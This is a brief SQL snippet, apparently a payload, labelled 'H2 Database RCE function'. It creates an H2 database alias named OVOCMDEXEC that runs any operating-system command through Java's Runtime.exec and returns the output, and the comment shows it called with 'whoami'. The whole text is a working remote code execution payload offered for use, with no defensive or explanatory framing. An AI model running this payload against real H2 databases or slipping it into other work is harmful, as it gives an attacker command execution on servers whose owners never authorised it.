/*
H2 Database RCE function 
CALL OVOCMDEXEC('whoami')
other functions are allowed as input as long as they return string.

*/
CREATE ALIAS OVOCMDEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
